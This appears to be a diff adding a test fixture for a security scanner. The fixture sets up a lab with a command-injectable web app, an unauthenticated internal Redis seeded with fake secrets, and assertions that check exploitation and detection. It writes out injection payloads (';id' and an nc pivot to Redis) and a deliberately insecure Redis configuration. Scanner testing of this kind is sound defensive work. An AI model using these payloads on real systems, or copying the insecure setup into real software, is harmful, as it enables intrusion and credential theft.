@@ -1,0 +1,83 @@
+name: chain-rce-pivot-internal
+description: >
+  Exploit chain: command injection in web app → internal network discovery →
+  pivot to unauthenticated Redis → credential harvest.
+  The web app has a command injection vulnerability. The post-exploit chain
+  uses the RCE to discover internal services (Redis) on the Docker network,
+  then pivots to extract credentials from those services.
+tags: [chain, postexploit, cmdinj, pivot, lateral-movement, authorized]
+
+services:
+  # Vulnerable web app with command injection
+  web:
+    build:
+      context: ./rce-pivot
+      dockerfile: Dockerfile
+    ports: ["0:8080"]
+    depends_on: [redis-internal]
+
+  # Internal Redis (not directly accessible from host — only via web's network)
+  redis-internal:
+    image: redis:7-alpine
+    command: ["redis-server", "--protected-mode", "no"]
+    # No port mapping — only accessible from within Docker network
+    expose: ["6379"]
+
+  # Seed Redis with secrets
+  seed:
+    image: redis:7-alpine
+    depends_on: [redis-internal]
+    restart: "no"
+    entrypoint: ["sh", "-c"]
+    command:
+      - |
+        sleep 3
+        redis-cli -h redis-internal SET production_db_password 'Sup3rS3cretPr0d!'
+        redis-cli -h redis-internal SET jwt_signing_key 'HS256-secret-key-do-not-share'
+        redis-cli -h redis-internal SET admin_api_token 'tok_live_abc123xyz789'
+
+ready:
+  cmd: "curl -sf http://localhost:${fixture.web.port}/health"
+  timeout: 60s
+  interval: 2s
+
+assertions:
+  # Verify command injection works
+  - name: exploit-cmdinj-id
+    type: command
+    expect:
+      command: "curl -sf 'http://localhost:${fixture.web.port}/ping?host=;id' | grep -q uid"
+      exit_code: 0
+
+  # Verify internal Redis is reachable from web container
+  - name: exploit-internal-redis-reachable
+    type: command
+    expect:
+      command: "curl -sf 'http://localhost:${fixture.web.port}/ping?host=;echo%20INFO%20|%20nc%20-w2%20redis-internal%206379' | grep -q redis_version"
+      exit_code: 0
+
+  # Beacon detects command injection
+  - name: detects-cmdinj
+    type: beacon
+    target: "localhost:${fixture.web.port}"
+    args: ["--no-enrich", "--scanners", "cmdinj", "--authorized", "--ports", "${fixture.web.port}"]
+    expect:
+      check_id: web.command_injection
+
+  # Post-exploit chain: lateral movement to internal Redis
+  - name: chain-lateral-movement
+    type: beacon
+    target: "localhost:${fixture.web.port}"
+    args: ["--no-enrich", "--authorized", "--ports", "${fixture.web.port}"]
+    expect:
+      check_id: exploit.lateral_movement
+
+  # Post-exploit chain: credential harvest from internal Redis
+  - name: chain-credential-harvest-via-pivot
+    type: beacon
+    target: "localhost:${fixture.web.port}"
+    args: ["--no-enrich", "--authorized", "--ports", "${fixture.web.port}"]
+    expect:
+      check_id: exploit.credential_harvest
+
+timeout: 10m
